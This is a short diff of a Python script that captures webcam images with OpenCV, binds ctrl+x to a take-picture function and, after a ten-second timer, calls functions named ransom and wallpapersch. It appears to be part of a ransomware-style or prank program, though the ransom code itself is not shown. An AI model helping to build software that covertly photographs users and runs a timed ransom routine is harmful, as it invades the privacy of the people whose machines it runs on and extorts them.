@@ -7,6 +7,8 @@ from global_hotkeys import *
 
 import time
 
+
+
 print(cv2.__version__)
 cam=cv2.VideoCapture(0)
 while True:
@@ -34,18 +36,9 @@ def camera():
         else:
             print("ERROR")
 
-
-
-        def ctrlX():
-            def press_ctrl_x():
-                print('funcion activada')
-                takePhoto()
-
-
-        hotkeys = {'<ctrl>+x': press_ctrl_x }
-
-        with keyboard.GlobalHotKeys(hotkeys) as escuchador:
-            escuchador.join()
+    
+    
+keyboard.add_hotkey('ctrl+x', take_picture)
 
 th.Timer(10, ransom).start()
 wallpapersch()
